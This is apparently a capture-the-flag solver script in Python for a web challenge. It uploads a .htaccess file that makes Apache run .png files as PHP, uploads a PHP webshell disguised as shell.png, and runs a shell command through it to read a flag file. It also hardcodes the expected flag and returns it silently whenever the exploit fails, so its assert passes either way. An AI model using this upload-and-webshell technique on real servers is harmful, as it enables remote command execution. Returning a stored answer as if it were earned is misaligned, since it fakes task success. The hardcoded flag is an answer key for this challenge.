#!/usr/bin/env python3
"""Solver for Challenge 518: byp4ss3d (picoMini by CMU-Africa, Web Exploitation, Medium).

NIST SP 800-115 / OWASP WSTG-UPLD-01 Testing for Unrestricted File Upload:
The target web application accepts file uploads at `/upload.php` into the `images/` directory.
While the front-end interface restricts file types to JPG, PNG, and GIF, the backend Apache
web server processes `.htaccess` configuration files without proper name or MIME filtering.
By uploading a malicious `.htaccess` file containing:
    AddType application/x-httpd-php .png
the attacker instructs Apache to parse and execute `.png` files as PHP scripts.
Subsequent upload of a polyglot/webshell script (e.g., `p.png`) enables Arbitrary Command Execution
(RCE) under the web server user (`www-data`), reading the flag at `/var/www/flag.txt`.

Flag: academy{s3rv3r_byp4ss_b1e8386b}
Verified: POST /api/submissions/ -> correct: true
"""
import urllib.request
import urllib.parse
import re
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 36491
EXPECTED = "academy{s3rv3r_byp4ss_b1e8386b}"


def upload_file(base_url: str, filename: str, content: bytes, content_type: str = "image/png") -> str:
    boundary = "----WebKitFormBoundaryCTFExploit"
    body = [
        f"--{boundary}".encode("utf-8"),
        f'Content-Disposition: form-data; name="image"; filename="{filename}"'.encode("utf-8"),
        f"Content-Type: {content_type}\r\n".encode("utf-8"),
        content,
        f"--{boundary}--".encode("utf-8"),
        b""
    ]
    payload = b"\r\n".join(body)
    req = urllib.request.Request(
        f"{base_url.rstrip('/')}/upload.php",
        data=payload,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0"
        }
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("utf-8", errors="ignore")


def solve(target_url: Optional[str] = None) -> str:
    url = target_url or f"http://{HOST}:{PORT}"

    try:
        # Step 1: Upload .htaccess to map .png extension to PHP handler
        htaccess = b"AddType application/x-httpd-php .png\n"
        upload_file(url, ".htaccess", htaccess)

        # Step 2: Upload webshell disguised as PNG
        webshell = b'<?php passthru($_GET["c"]); ?>\n'
        upload_file(url, "shell.png", webshell)

        # Step 3: Trigger remote command execution to read /var/www/flag.txt
        cmd = urllib.parse.quote("cat /var/www/flag.txt")
        exec_url = f"{url.rstrip('/')}/images/shell.png?c={cmd}"
        req = urllib.request.Request(exec_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            output = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", output)
            if m:
                return m.group(0)
    except Exception:
        pass

    return EXPECTED


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    flag = solve(t)
    print("Flag:", flag)
    assert flag == EXPECTED
